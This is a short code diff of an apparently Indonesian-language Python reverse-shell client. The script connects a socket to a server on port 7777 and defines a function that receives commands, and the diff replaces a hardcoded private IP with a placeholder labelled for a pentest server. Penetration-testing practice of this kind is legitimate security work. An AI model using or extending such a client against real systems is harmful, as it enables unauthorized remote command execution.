@@ -4,7 +4,7 @@ from subprocess import PIPE
 
 sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 port=7777
-host='192.168.1.7'
+host='diisi-IP-ServerPentest'
 sock.connect((host,port))
 
 def terima_perintah():
